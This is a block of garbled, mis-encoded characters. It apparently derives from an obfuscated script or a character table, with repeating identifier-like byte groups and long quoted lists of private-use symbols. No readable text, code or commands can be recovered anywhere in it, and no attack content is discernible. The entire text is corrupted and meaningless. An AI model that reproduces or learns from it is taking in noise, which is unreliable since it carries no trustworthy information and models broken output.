³©öî¦éíëòùé´ù÷ö½ò³©öî¦çê»òù·êù÷÷øøÿ¤÷¥½±°­ªþã¥£å³©öî¦íí¸òù¬ù÷ãò³©öî¦æì¿òù¿³½éù÷ã½ò³©öî¦ì¸¸òù¿³½éù÷ã¸³©öî¦êïïòù¶ªëù÷¢¢³©öî¦ìçºòù°ù÷ò³©öî¦è¼½òù¹½ù÷ãò³©öî¦èíçòùîù÷ãò³©öî¦ê¸¿òùôûù÷ãÿò²±¹¹»¬³©öî¦¸èòùêïù÷ö÷å£½±°­ªþ¦ã³©öî¦êìëòùù÷ö¹»ª¹°±¬»·­ª÷òã¦³©öî¦í»êòù°ù÷ö÷å·¸ö÷¥³©öî¦ïæïòùë¼ù÷ö­¿¨»»­­¿¹»ò¸ò°ò÷³©öî¦èê¿òùµ¤¼ûù÷öö÷ãà¥£÷å·¸ö³©öî¦ïºëòùç®ù÷ö·­·»©°½»ò¸÷÷³©öî¦çæîòù§ç¶ù÷ö­¿¨»·»©°½»ò¸ò°ò÷³©öî¦ì¸æòù·¼ïù÷öö÷ãà¥£÷å·¸ö³©öî¦è¼¼òù¶ªëù÷ö·­«º±ò°ò÷÷¥½±°­ªþ¯ã³©öî¦ïèíòùî³íù÷ö¹»ª¬»¸·¦÷òã³©öî¦æìïòùç®ù÷ö·­±¬»¸·¦±º»÷ò¸ãáö¿³©öî¦éîëòù¦µù÷ö÷³©öî¦ïé¿òù¤û»ù÷öñ­õñ÷óî¦ïíïïõóî¦ï¿»ïõî¦ìº¸ì¢¢ùù÷³©öî¦èí¼òù­¤ù÷õù»ùö÷ä¿³©öî¦ïêëòùë¼ù÷ö¯÷áö¿³©öî¦ïé¸òù®ù÷ö¯³©öî¦çë½òùµ¤¼ûù÷÷³©öî¦ëìîòùôûù÷ö÷³©öî¦ê»éòù¶ªëù÷öñ­õñ÷óî¦ïççôî¦ïèõóî¦ï¼»ïõî¦í¸îé¢¢ùù÷³©öî¦íéºòù¸é¶ù÷õù»ùö÷ä°«²²å·¸ö³©öî¦éº¿òùé¸ù÷ö¸ò³©öî¦æê¿òù¿³½éù÷÷øø³©öî¦èæ¼òù·êù÷÷¥½±°­ªþ¶ãá¿³©öî¦éæ½òù­¤ù÷ö÷³©öî¦ê»éòù¶ªëù÷öñ­õñ÷³©öî¦ëíìòùç®ù÷öî¦ïêï¸õî¦æôóî¦íëèõî¦ïôî¦èçì÷ä¿³©öî¦ïïìòù¦µù÷ö¯³©öî¦ì¸êòùù÷÷³©öî¦éï¿òù·¼ïù÷ö÷³©öî¦æ½èòù±ëù÷öñ­õñ÷³©öî¦ºêòù·êù÷öî¦è¸õóî¦èèéõî¦ë¸çôî¦ï÷òã¥ù­±½µùä³òù³­¹ùä¸òù´·ºùäòù­»°º»¬ùä°òù­»°º»¬«³ùä½òù¿¬¹­ùä¶òù¼±º§ùä¿òù½±³³¿°ºùä³©öî¦èë½òùêïù÷òù¯«±ª»ºùä´òù³»°ª·±°­ùäºòù¸¬±³¬±«®ùäòù¸¬±³»ùä¤òù·­©°»¬ùä³©öî¦íìéòùî³íù÷ö·­©°»¬ò°÷òù·­«º±ùä³©öî¦é»êòù´ºù÷ö·­«º±ò°ò÷òù¹¬±«®»ªª·°¹­ùäá³©öî¦ææèòù¹½ù÷ö¹»ª¬±«®»ªª·°¹­ò÷ä¥£òù®¬»¸·¦ùä¯òù¬»®²§ùäãà­»°º»®²§ö³òòª§®»±¸þããã³©öî¦ê¼ºòùôëù÷á¥ùª»¦ªùä£äò¸÷òù­»°º­¹ùäãà³³©öî¦í½çòùé´ù÷õù»ùöò÷òù­·³«²¿ª»¬»­»°½»ùäö÷ãà¥£òù¬»¿½ªùäãà³³©öî¦êèíòùµ¤¼ûù÷õù»ùöò¥ù¬»¿½ªùä¥ùª»¦ªùäòùµ»§ùä¸³©öî¦èî¸òùù÷££÷£åª¬§¥·¸ö³©öî¦èéìòù¬ù÷ö³©öî¦ë¿íòù®ù÷ò³©öî¦ïºïòùî³íù÷÷÷¥½±°­ªþ°ã³©öî¦ï»»òù·¼ïù÷öªòù·ºù¢¢ùù÷ò¤ã³©öî¦êº¿òù¨§ù÷ö¯ò³©öî¦í¼ïòù«¹¤ù÷¢¢ùù÷å¬»ª«¬°þ³©öî¦çî½òù÷¬û½ù÷ö°ò³©öî¦ëê¿òùç®ù÷ö¸ò¶÷÷¢¢³©öî¦ïïéòùé¸ù÷ö¤ò÷å£»²­»þ¿©¿·ªþ³©öî¦ììæòù°ù÷ö÷å£½¿ª½¶ö°÷¥£££½±°ª·°«»å£·¸öÿ¤÷³©öî¦êîéòùÿéù÷ö¬«°¬»­»°½»²»¦ò³òò÷å·¸ö³©öî¦çè»òù¶ªëù÷ö¿³©öî¦æéèòùµ¤¼ûù÷ö÷ò³©öî¦ç¿ëòù«®³ù÷÷÷¥½±°­ªþ¤ã³©öî¦í½êòùæù÷ö·­©°»¬ò°÷¢¢³©öî¦ìºëòùç®ù÷ö·­«º±ò°ò÷¢¢³©öî¦»éòù¦µù÷ö½ò³©öî¦çêéòù±ëù÷÷å·¸ö¤÷¥½±°­ªþã³©öî¦êéæòùîù÷ö¹»ª¬»¸·¦÷åª¬§¥·¸ö³©öî¦ìë»òùê©¯ù÷ö³©öî¦çéèòù·êù÷ò³©öî¦æ¸êòùê©¯ù÷÷÷ã³©öî¦éèéòùù÷òãùùõõùù¢¢³©öî¦ï¼éòù¸èù÷å»²­»¥½±°­ªþ¿ã¥£å¿³©öî¦ìé¿òù¸é¶ù÷ã¸ò¿©¿·ªþ³³©öî¦éê¼òùµýù÷õù»ùöò¥ùª»¦ªùä³©öî¦éêêòù÷¬û½ù÷ö³©öî¦ëë½òùºëèù÷ö³©öî¦í¿çòùµ³ïù÷ò³©öî¦ïè½òùê©¯ù÷öòùù÷¢¢³©öî¦æº¼òùºëèù÷öò³©öî¦ëêïòù°ç¬ù÷÷á³©öî¦íéèòùì±ù÷ä÷òù¾ù÷£ò¿÷å££½¿ª½¶ö÷¥££½±°ª·°«»å£·¸ö¤øø³©öî¦¸ïòùî³íù÷ö·­©°»¬ò°÷øø´øø³©öî¦èëëòù¦±ù÷ö·­«±ª»º·»©°½»ò´³©öî¦çí¿òù«®³ù÷÷÷¥·¸ö³©öî¦ïêèòùî½ù÷ö³©öî¦éæéòùé´ù÷ò³©öî¦íì¿òù¬ù÷÷÷¥½±°­ªþºã³©öî¦ïº½òù·¼ïù÷å·¸öÿº÷¬»ª«¬°ùùå¬»ª«¬°þº³©öî¦é¸èòù÷¬û½ù÷õù±°ù¢¢º³©öî¦ïæºòùù÷õ³©öî¦ì¼çòùé´ù÷øøº³©öî¦çºìòù°ç¬ù÷õ³©öî¦ê¼»òù¹½ù÷³©öî¦èíìòù¦±ù÷¢¢º³©öî¦çîæòù°ù÷õù¹»ùøøº³©öî¦çíïòù´ºù÷õù¹»ù³©öî¦íê¼òù¶ªëù÷¢¢º³©öî¦ïèèòùµýù÷õù¹»ùøøº³©öî¦»ïòù¤û»ù÷õù¹»ù³©öî¦ëïëòùë¼ù÷¢¢º³©öî¦çîîòù°ù÷õ³©öî¦í¼¸òù¿³½éù÷õù¹»ùøøº³©öî¦ìîºòù²êöêù÷õ³©öî¦ç½êòù¶ªëù÷õù¹»ù³©öî¦æº½òùîù÷õ³©öî¦íèìòùÿéù÷¢¢º³©öî¦ê»êòùî³íù÷õ³©öî¦æ¸éòù«®³ù÷øøº³©öî¦èæèòù°ù÷õ³©öî¦ëç¼òùîù÷³©öî¦ï¸ìòù·¼ïù÷õ³©öî¦êç¼òù¦±ù÷øøº³©öî¦èîìòùù÷õ³©öî¦êìæòùµ¤¼ûù÷³©öî¦æ»îòùîù÷õ³©öî¦ë»æòù·êù÷³©öî¦ï»ºòùôëù÷õ³©öî¦èï»òù¤û»ù÷¢¢ùùå£»²­»¥½±°­ªþºã¿³©öî¦çïèòùìù÷ö÷òã°»©þ»ªöù⃓ùòùﻑùòùﻐùòù񈬥ùòù񈬢ùòù񈬣ùòù񈬠ùòù񈬡ùòù⚞ùòù⚜ùòù♹ùòù񈤸ùòù񈤹ùòù񈤶ùòù񈤷ùòù񈤴ùòù񈤵ùòù񈤲ùòù񈤳ùòù񈤰ùòù񈤱ùòù񈤮ùòù񈤯ùòù񈤬ùòù񈤭ùòù񈤪ùòù񈤫ùòù񈤨ùòù񈤩ùòù񈤦ùòù񈤧ùòù񈤤ùòù񈤥ùòù񈤢ùòù񈤣ùòù񈤠ùòù񈤡ùòù񈻞ùòù񈻝ùòù񈻚ùòù񈻟ùòù񈻘ùòù񈻛ùòù񈻜ùòù񈇽ùòù񈆬ùòù񈆧ùòù񈻔ùòù񈻙ùòù񈺜ùòù񈺝ùòù񈻗ùòù񈻒ùòù񈻓ùòù񈆮ùòù񈻆ùòù񈻉ùòù񈻇ùòù񈻄ùòù񈻕ùòù񈻅ùòù񈻃ùòù񈻂ùòù񈇴ùòù񈇶ùòù񈄎ùòù񈇍ùòù񈻐ùòù񈆦ùòù񈇷ùòù񈆭ùòù񈻑ùòù񈻌ùòù񈻀ùòù񈻊ùòù񈻁ùòù񈻋ùòù񈺟ùòù⛧ﻑùòù񈻽ùòù񈻈ùòù񈻵ùòù񈻷ùòù񈆤ùòù񈻼ùòù񈻳ùòù񈻺ùòù񈻾ùòù񈻿ùòù񈇲ùòù񈇱ùòù񈻭ùòù񈆫ùòù񈆨ùòù񈻯ùòù񈻶ùòù񈻮ùòù񈻻ùòù񈻍ùòù񈇉ùòù񈇊ùòù񈈽ùòù񈇳ùòù񈈼ùòù񈇵ùòù񈇻ùòù񈻨ùòù񈻎ùòù񈻏ùòù񈻲ùòù񈈾ùòù񈺚ùòù񈻱ùòù񈻸ùòù񈻹ùòù񈻰ùòù񈻬ùòù񈆯ùòù񈻪ùòù񈇺ùòù񈻴ùòù񈻫ùòù񈈻ùòù񈇎ùòù񈆪ùòù񈇼ùòù񈇰ùòù񈇹ùòù񈻩ùòù񈇌ùòù񈇋ùòù񈇏ùòù񈇾ùòù񈻖ùòù񈲡ùòù񈲧ùòù񈲤ùòù񈇿ùòù񈱷ùòù񈲥ùòù񈱞ùòù⛾ﻑùòù񈲣ùòù񈲠ùòù񈇈ùòù񈭝ùòù񈻤ùòù񈻦ùòù񈻧ùòù񈻥ùòù񈻢ùòù񈻣ùòù񈺞ùòù񈻡ùòù񈻠ùòù񈈶ùòù➺ﻑùòù񈊩ùòù񈊫ùòù񈊨ùòù񈄿ùòù񈱅ùòù񈱄ùòù񈱇ùòù񈱂ùòù񈵺ùòù񈇓ùòù񈇐ùòù񈱊ùò³©öî¦æì»òùµýù÷ò³©öî¦æêæòùù÷òù➽ﻑùòù񈱋ùòù񈱀ùòù񈱍ùòù񈱉ùòù񈱈ùòù񈱆ùòù񈱃ùòù񈱁ùòù񈈞ùòù񈱒ùòù񈲕ùòù񈇄ùòù񈵎ùòù⟕ùòù񈵈ùòù񈈯ùòù񈈬ùòù񈈭ùòù񈈪ùòù񈈩ùòù񈈦ùòù񈲒ùòù񈇒ùòù񈇑ùòù⟒ﻑùòù񈇀ùòù񈈮ùòù񈇁ùòù񈇆ùòù񈇇ùòù񈲖ùòù񈲗ùòù񈲘ùòù񈵋ùòù񈲙ùòù⛃ﻑùòù񈲓ùòù񈲐ùòù⟔ùòù񈲔ùòù񈇅ùòù񈇂ùòù񈲑ùòù񈺒ùòù񈈨ùòù񈲎ùòù񈇬ùòù񈇃ùòù񈺑ùòù⟓ﻑùòù񈱛ùòù񈇭ùòù񈱴ùòù񈅠ùòù񈅡ùòù񈅫ùòù񈅨ùòù񈲜ùòù񈅥ùòù񈲝ùòù񈄾ùòù񈈟ùòù񈅩ùòù񈅪ùòù񈲞ùòù񈲟ùòù񈲛ùòù񈲚ùòù񈈸ùòù񈱕ùòù񈊦ùòù񈲨ùòù񈲹ùòù񈄌ùòù񈲸ùòù񈲷ùòù񈄏ùòù񈲶ùò³©öî¦è¸èòù¬ù÷ò³©öî¦ïè¸òùç®ù÷ò³©öî¦èéºòùîù÷ò³©öî¦ê»ìòù÷¬û½ù÷ò³©öî¦êì¼òùæù÷ò³©öî¦ïç¿òùÿéù÷ò³©öî¦êºìòùé¸ù÷òù񈲯ùò³©öî¦»êòùé´ù÷ò³©öî¦è½êòù¹½ù÷ò³©öî¦é¸¿òùé¸ù÷ò³©öî¦ïºçòùù÷ò³©öî¦èíèòù­¦êù÷ò³©öî¦ìèëòùê©¯ù÷ò³©öî¦éêèòùù÷ò³©öî¦êë¿òùÿéù÷òù񈄊ùò³©öî¦êê¿òùë¼ù÷òù񈲫ùòù񈄍ùòù񈲪ùòù񈲬ùò³©öî¦ç»¿òù­¤ù÷òù񈲭ùò³©öî¦ëíéòùæù÷òù񈄋ùò³©öî¦ìæíòùç®ù÷òù񈲰ùò³©öî¦ï½»òù¦±ù÷ò³©öî¦ï½èòùù÷òù񈲩ùò³©öî¦êïçòùç®ù÷ò³©öî¦èëºòù­¤ù÷òù񈱜ùò³©öî¦ç½¼òùôûù÷ò³©öî¦ìêìòùì±ù÷ò³©öî¦ëéêòùµ³ïù÷ò³©öî¦ìééòùî³íù÷ò³©öî¦éî½òùù÷ò³©öî¦ëë¼òù¦±ù÷ò³©öî¦ë¼èòù±ëù÷ò³©öî¦êèºòùµýù÷ò³©öî¦è»ïòùé¸ù÷ò³©öî¦æ¿êòùê©¯ù÷ò³©öî¦íºìòù«®³ù÷ò³©öî¦êë¼òùôëù÷ò³©öî¦íºïòùç®ù÷ò³©öî¦æï¸òù¿³½éù÷ò³©öî¦éëìòù¸é¶ù÷ò³©öî¦éìëòùîù÷ò³©öî¦ë¿½òù¹½ù÷ò³©öî¦éèëòùµýù÷ò³©öî¦èéêòùê©¯ù÷ò³©öî¦ïéæòù°ù÷ò³©öî¦ì¸éòù½«ù÷ò³©öî¦èºçòù¤û»ù÷ò³©öî¦ëæéòùî³íù÷ò³©öî¦êîèòù«®³ù÷ò³©öî¦çèèòù°ù÷ò³©öî¦íëèòùç®ù÷ò³©öî¦êîêòùéÿ­ù÷ò³©öî¦íééòùîù÷ò³©öî¦êçêòùôëù÷ò³©öî¦íêìòùé¸ù÷ò³©öî¦çëæòùµ³ïù÷ò³©öî¦æ»íòùîù÷ò³©öî¦ºèòùê©¯ù÷ò³©öî¦æ½éòùêïù÷ò³©öî¦íç¼òùç®ù÷ò³©öî¦æ¿¼òùî½ù÷ò³©öî¦éç¿òùê©¯ù÷ò³©öî¦ëïîòùî³íù÷ò³©öî¦íëìòù¦±ù÷ò³©öî¦ë»îòùôëù÷ò³©öî¦ççºòùºëèù÷ò³©öî¦çêæòù°ç¬ù÷ò³©öî¦ïê½òù¦±ù÷ò³©öî¦í½ºòùîù÷ò³©öî¦ëæêòùµýù÷ò³©öî¦æç¼òùù÷ò³©öî¦æ¿»òùµ¤¼ûù÷ò³©öî¦éì¸òù«¹¤ù÷ò³©öî¦êï½òù³ù÷ò³©öî¦ìççòùìù÷ò³©öî¦ëëéòùù÷ò³©öî¦ï½ïòùéÿ­ù÷ò³©öî¦èë¸òù¦±ù÷òù񈲮ùò³©öî¦ëïìòù¸èù÷ò³©öî¦é½¸òùµ¤¼ûù÷òù񈇫ùò³©öî¦ï¿èòù­¤ù÷òù񈲦ùòù񈈛ùòù񈇪ùòù񈆩ùò³©öî¦ìíçòù­¦êù÷òù񈅦ùò³©öî¦çêºòùêïù÷ò³©öî¦æêïòùù÷òù񈅧ùò³©öî¦ééíòùµýù÷òù񈇨ùò³©öî¦ííçòùì±ù÷òù񈭛ùò³©öî¦êéîòùî³íù÷òù񈄇ùò³©öî¦ï½ìòù¸èù÷ò³©öî¦éºëòùî³íù÷òù񈄃ùò³©öî¦çº»òù¦±ù÷ò³©öî¦éççòùé´ù÷òù񈄅ùò³©öî¦èìëòù±ëù÷ò³©öî¦ì¼íòù¬ù÷òù񈄁ùò³©öî¦èêèòù¿³½éù÷ò³©öî¦ºíòùéÿ­ù÷òù񈄀ùò³©öî¦æìçòùìù÷ò³©öî¦æ¼»òùî³íù÷òù񈄂ùò³©öî¦êºçòù­¦êù÷ò³©öî¦æèëòù¨§ù÷òù񈄄ùò³©öî¦ï¼ïòù°ç¬ù÷òù񈲢ùòù񈇮ùòù񈈚ùòù񈈛ùòù񈇯ùò³©öî¦éé¼òù¹½ù÷ò³©öî¦ççïòù´ºù÷ò³©öî¦é¸îòù¶ªëù÷ò³©öî¦ëæçòù¬ù÷òù񈺙ùò³©öî¦çï½òù¤û»ù÷ò³©öî¦»çòùî½ù÷òù񈱟ùò³©öî¦í»èòùêïù÷ò³©öî¦êêïòù°ç¬ù÷òù񈺛ùò³©öî¦ì½çòùµ³ïù÷ò³©öî¦è»ëòù°ù÷òù񈺘ùò³©öî¦êëíòùôëù÷ò³©öî¦æê¸òùµ¤¼ûù÷òù񈺕ùò³©öî¦ïç¸òù°ç¬ù÷ò³©öî¦ïêæòùì±ù÷òù񈄑ùò³©öî¦éïìòùôûù÷ò³©öî¦íæïòù¨§ù÷òù񈇸ùò³©öî¦ëë»òù°ù÷ò³©öî¦é½íòùéÿ­ù÷òù񈇩ùò³©öî¦íë¼òùë¼ù÷ò³©öî¦æ½çòùµ³ïù÷òù񈺐ùò³©öî¦ìííòùºëèù÷ò³©öî¦í½¼òùµ¤¼ûù÷òù񈺓ùò³©öî¦éìéòù¿³½éù÷ò³©öî¦½èòù°ù÷òù񈱙ùò³©öî¦ì½¸òù½«ù÷ò³©öî¦æîìòùÿéù÷òù񈱘ùò³©öî¦ïèçòùî³íù÷ò³©öî¦ì¼êòùé´ù÷òù񈄈ùò³©öî¦ïççòù¸é¶ù÷òù񈱛ùòù񈇭ùòù񈱴ùòù񈲜ùòù񈲝ùòù񈅫ùòù񈅨ùòù񈵎ùòù⟕ùòù񈲒ùòù񈇒ùòù񈇑ùòù⟒ﻑùòù񈇀ùòù񈇁ùòù񈇆ùòù񈇇ùòù񈲖ùòù񈲗ùòù񈲘ùòù񈲙ùòù⛃ﻑùòù⟓ﻑùòù񈇭ùòù񈺑ùòù☩ùòù񈬜ùò³©öî¦ïî¼òùù÷ò³©öî¦éº½òùì±ù÷ò³©öî¦ééêòù¦µù÷ò³©öî¦çìºòùîù÷òù񈇢ùò³©öî¦íîéòù«®³ù÷ò³©öî¦é½ïòùìù÷òù񈇦ùò³©öî¦ç¼èòù­¤ù÷ò³©öî¦ì»»òùîù÷òù☧ﻑùò³©öî¦ïìîòùµýù÷òù񈇤ùò³©öî¦ííéòù®ù÷òù񈇠ùò³©öî¦í¸èòùù÷ò³©öî¦ë¸èòùîù÷ò³©öî¦è¼ìòùé´ù÷ò³©öî¦é¸»òù¬ù÷òù񈬙ùò³©öî¦çºïòùç®ù÷òù񈄆ùò³©öî¦çë¼òùµýù÷ò³©öî¦êííòù­¦êù÷òù񈬚ùò³©öî¦ì½ìòù®ù÷ò³©öî¦ºëòùìù÷òù񈬔ùò³©öî¦èæëòù¬ù÷ò³©öî¦ê»æòù²êöêù÷òù񈇣ùò³©öî¦êëêòù²êöêù÷ò³©öî¦æîíòùµ¤¼ûù÷òù񈹽ùò³©öî¦êîíòù«®³ù÷ò³©öî¦í¼éòù¸é¶ù÷òù񈄉ùò³©öî¦ê¸îòù°ù÷ò³©öî¦éêïòùéÿ­ù÷òù񈹫ùò³©öî¦ëºíòùìù÷ò³©öî¦êëïòù÷¬û½ù÷òù񈹪ùò³©öî¦ëì¿òùî½ù÷òù񈬘ùòù񈆙ùòù񈆖ùòù񈆗ùòù񈬛ùòù񈭈ùòù񈬫ùòù񈭉ùòù񈭵ùòù񈭁ùòù񈭴ùò³©öî¦çº½òù«¹¤ù÷òù񈇧ùò³©öî¦ëçëòù´ºù÷òù񈭳ùòù񈊮ùòù񈭶ùòù񈭲ùòù񈭺ùòù񈭹ùòù񈭢ùòù񈭧ùòù񈆟ùòù񈉆ùòù񈭩ùòù񈭤ùòù񈉉ùòù񈭦ùòù񈉋ùòù񈭥ùòù񈭬ùòù⚁ùòù񈭱ùòù񈭭ùòù񈭰ùòù񈭮ùòù񈄷ùòù񈳨ùòù񈳯ùòù񈳳ùòù񈳧ùòù񈳮ùòù񈅔ùòù񈳥ùòù񈳢ùò³©öî¦çº¼òùî³íù÷òù񈳶ùòù񈳱ùòù񈅟ùòù񈳰ùòù񈳩ùòù񈳣ùòù񈳦ùòù񈳫ùòù񈺖ùòù񈺗ùòù񈺔ùòù񈳌ùòù񈳊ùòù񈳹ùòù񈳸ùòù񈳺ùòù񈳽ùòù񈳻ùòù񈅘ùòù񈅛ùòù񈅗ùòù񈅙ùòù񈳤ùòù񈳉ùòù񈳪ùòù񈅚ùòù񈳃ùòù񈉯ùòù񈳅ùòù񈅕ùòù񈳒ùòù񈳀ùòù񈳂ùòù񈅉ùòù񈉭ùòù񈶩ùòù񈶦ùòù񈅜ùòù񈳼ùòù񈳓ùòù񈅐ùòù񈅈ùòù񈅋ùòù񈳇ùòù񈅏ùòù񈅎ùòù񈅀ùòù񈅞ùòù񈳿ùòù񈳾ùòù񈳁ùòù񈳲ùòù񈳭ùòù񈳕ùòù񈅖ùòù񈳔ùòù񈳛ùòù񈳘ùòù񈅍ùòù񈅓ùòù񈅹ùòù񈳆ùòù񈅅ùòù񈅑ùòù񈳴ùòù񈳵ùòù񈅌ùòù񈅆ùòù񈅲ùòù񈳝ùòù񈳜ùòù񈳚ùòù񈳐ùòù񈳈ùòù񈳑ùòù񈳏ùòù񈅇ùòù񈳎ùòù񈅒ùòù񈳋ùòù񈳷ùòù񈅰ùò³©öî¦æïïòùù÷òù񈳖ùò³©öî¦çí»òù·¼ïù÷òù񈉨ùòù񈳍ùòù񈅝ùòù񈅄ùòù񈅂ùòù񈅼ùòù񈅷ùòù񈶔ùòù񈳙ùòù񈅃ùòù񈅶ùòù񈅿ùòù񈅵ùòù񈅸ùòù񈅻ùòù񈳟ùòù񈳞ùòù񈳡ùòù񈅊ùòù񈳠ùòù񈳗ùòù񈳬ùòù񈯫ùòù񈭚ùòù񈯬ùòù񈯭ùòù񈯪ùòù񈉧ùòù񈉤ùòù񈉫ùòù񈯯ùòù񈯡ùòù⛆ﻑùòù񈮞ùòù񈭓ùòù񈉪ùòù񈭕ùòù񈮝ùòù񈮜ùòù񈮟ùòù񈮚ùòù񈳄ùòù񈉶ùòù񈯠ùòù񈱎ùòù񈯩ùòù񈯧ùòù񈆞ùòù񈯤ùòù񈯦ùòù񈯢ùòù񈯥ùòù񈯀ùòù񈯃ùòù񈯅ùòù񈯂ùòù񈯄ùòù񈯋ùòù񈯈ùòù񈯉ùòù񈯆ùòù񈯏ùòù񈯌ùòù񈯍ùòù񈯊ùòù񈯇ùòù񈯐ùòù񈯓ùòù񈯑ùòù񈉎ùòù񈱵ùòù⮎ﻑùòù񈯁ùòù⟶ùòù♿ﻑùòù⛚ﻑùòù񈱻ùòù񈷻ùòù񈯴ùòù񈯖ùòù⛞ﻑùòù񈯺ùòù☛ﻑùòù񈯻ùòù⛟ﻑùòù񈯸ùòù񈯹ùòù☖ùòù񈯷ùòù񈯶ùòù➚ﻑùòù⛝ﻑùòù☚ﻑùòù񈯲ùòù񈱶ùòù񈱹ùòù񈱸ùòù⛊ﻑùòù⛜ﻑùòù񈯔ùòù񈯵ùòù񈮑ùòù񈮐ùòù񈮎ùòù񈮔ùòù񈮕ùòù񈮒ùòù񈮗ùòù񈮙ùòù񈮍ùòù񈈎ùòù񈮖ùòù񈮌ùòù񈮏ùòù񈮓ùòù񈆃ùòù񈮛ùòù񈮘ùòù񈆏ùòù񈆸ùòù񈆲ùòù񈆌ùòù񈯨ùòù񈈏ùòù񈯣ùòù񈆋ùòù񈈌ùòù񈄚ùòù񈄛ùòù񈆊ùòù񈮾ùòù񈆎ùòù񈆱ùòù񈮀ùòù񈆈ùòù񈆶ùòù񈄞ùòù񈆄ùòù񈮭ùòù񈄖ùòù񈆀ùòù񈄙ùòù񈆍ùòù񈆷ùòù񈮉ùòù񈮈ùòù񈅪ùòù񈯳ùòù񈮊ùòù񈮁ùòù񈮋ùòù񈈍ùòù񈆴ùòù񈆇ùòù񈄘ùòù񈯰ùòù񈯱ùòù񈈊ùòù񈆉ùòù񈆆ùòù񈈋ùòù񈆵ùòù񈮃ùòù񈮂ùòù񈮬ùòù񈮅ùòù񈮽ùòù񈮯ùòù񈆁ùòù񈅴ùòù񈮺ùòù񈮇ùòù񈮄ùòù񈮆ùòù񈮻ùòù񈆾ùòù񈆰ùòù񈮼ùòù񈮿ùòù񈮹ùòù񈮶ùòù񈮸ùòù񈆹ùòù񈄟ùòù񈮮ùòù񈭜ùòù񈮰ùòù񈮳ùòù񈮲ùòù񈮵ùòù񈮡ùòù񈮷ùòù񈮴ùòù񈯮ùòù񈆂ùòù񈮱ùòù񈆅ùòù񈮢ùòù񈈈ùòù⛋ﻑùòù񈮫ùòù񈄝ùòù񈆺ùòù񈄕ùòù񈮨ùòù񈮤ùòù񈮥ùòù񈆜ùòù񈮩ùòù񈆝ùòù񈮦ùòù񈮧ùòù񈄗ùòù񈮠ùòù񈄔ùòù񈆚ùòù񈮪ùòù񈮣ùòù񈆽ùòù񈆿ùòù񈆼ùòù񈄜ùòù񈹉ùòù񈹋ùòù񈹇ùòù񈹒ùòù񈹐ùòù񈬐ùòù񈹍ùòù񈹏ùòù񈹌ùòù񈹎ùòù񈸥ùòù񈹄ùòù񈹅ùòù񈹂ùòù񈅱ùòù񈅣ùòù񈅢ùòù񈸪ùòù񈹬ùòù񈸫ùòù񈬓ùòù񈸤ùòù񈹶ùòù񈹊ùòù񈹓ùòù񈹆ùòù񈹈ùòù񈹿ùòù񈹾ùòù񈹁ùòù񈹝ùòù񈹕ùòù񈹀ùòù񈹃ùòù񈹚ùòù񈹛ùòù񈹖ùòù񈹜ùòù񈹘ùòù񈹙ùòù񈹔ùòù񈹗ùòù⟖ﻑùòù񈸵ùòù񈸲ùòù񈸷ùòù񈱤ùòù񈸮ùòù񈹞ùòù񈸦ùòù񈹟ùòù񈸨ùòù☫ﻑùòù񈹺ùòù񈸻ùòù񈸭ùòù☪ùòù񈹼ùòù♍ﻑùòù񈉃ùòù☣ﻑùòù񈹹ùòù񈹸ùòù񈹻ùòù񈹑ùòù񈴤ùòù񈴡ùòù񈴣ùòù񈴢ùòù񈬮ùòù񈬱ùòù񈬁ùòù񈭿ùòù񈭼ùòù񈭾ùòù☬ﻑùòù☯ùòù񈬈ùòù񈬃ùòù񈬂ùòù񈯕ùòù☮ùòù񈬊ùòù񈴥ùòù񈬋ùòù☤ﻑùòù񈸈ùòù񈬾ùòù񈬿ùòù񈬆ùòù񈬄ùòù񈬉ùòù񈬳ùòù񈬼ùòù񈬲ùòù񈬽ùòù񈬺ùòù񈬻ùòù񈬸ùòù񈬶ùòù񈬴ùòù񈬵ùòù񈬷ùòù񈱌ùòù񈬅ùòù☴ﻑùòù񈶒ùòù񈶓ùòù񈸋ùòù񈶕ùòù☷ùòù񈸺ùòù񈸽ùòù񈴠ùòù񈭏ùòù񈬀ùòù񈯛ùòù񈯚ùòù񈯾ùòù񈭙ùòù񈭘ùòù񈯙ùòù񈯘ùòù񈬇ùòù񈯝ùòù񈯒ùòù񈯗ùòù񈯟ùòù⏄ﻑùòù񈰯ùòù񈰬ùòù񈱥ùòù⏶ﻑùòù񈵻ùòù񈵶ùòù񈵯ùòù񈵬ùòù񈶧ùòù񈴂ùòù񈱣ùòù񈱠ùòù񈱡ùòù񈰞ùòù񈰢ùòù񈰩ùòù񈰦ùòù񈰧ùòù񈭻ùòù񈰣ùòù񈭀ùòù񈰀ùòù⛐ﻑùòù񈰁ùòù񈰾ùòù񈰤ùòù񈰥ùòù񈭇ùòù񈭄ùòù񈭅ùòù񈄳ùòù⌯ùòù⌬ùòù⌮ùòù񈶮ùòù⏅ﻑùòù⌭ùòù񈰿ùòù񈷕ùòù񈉵ùòù񈷒ùòù񈱿ùòù񈷸ùòù񈶱ùòù񈉊ùòù񈄱ùòù񈸼ùòù񈱦ùòù񈱫ùòù񈱪ùòù񈱨ùòù񈱩ùòù񈉇ùòù񈱮ùòù񈱭ùòù񈱐ùòù♈ﻑùòù񈉂ùòù񈄮ùòù񈉅ùòù񈷹ùòù񈉂ùòù񈷶ùòù♌ùòù񈸾ùòù☑ùòù񈉄ùòù񈷷ùòù♇ﻑùòù񈉺ùòù񈄯ùòù☍ùòù񈄬ùòù񈷵ùòù񈱽ùòù񈄯ùòù񈷴ùòù񈴿ùòù♊ﻑùòù񈸿ùòù񈹲ùòù♮ﻑùòù񈉸ùòù♯ﻑùòù񈬤ùòù񈷰ùòù񈰡ùòù񈄡ùòù񈱐ùòù񈷊ùòù񈷋ùòù񈰽ùòù񈰼ùòù񈱲ùòù񈱳ùòù񈴱ùòù⚾ﻑùòù⚽ﻑùòù⚻ﻑùòù⚸ﻑùòù񈠑ùòù񈭪ùò³©öî¦çê½òù°ç¬ù÷òù񈶎ùòù񈶏ùòù񈶌ùòù񈶍ùòù񈶊ùòù񈶋ùòù񈶈ùòù񈶉ùòù񈶆ùòù񈶇ùòù񈶄ùòù񈶅ùòù񈶂ùòù񈶃ùòù񈶀ùòù񈶁ùòù񈶾ùòù񈶿ùòù񈶼ùòù񈶽ùòù񈶺ùòù񈶻ùòù񈶸ùòù񈶹ùòù񈱰ùòù񈱱ùòù⚶ﻑùòù񈱼ùòù񈱲ùò³©öî¦íèèòùê©¯ù÷òù񈴶ùòù񈴱ùòù񈱳ùòù񈱺ùòù񈱾ùòù⚾ﻑùòù⚻ﻑùòù⚸ﻑùòù⚽ﻑùòù񈠑ùò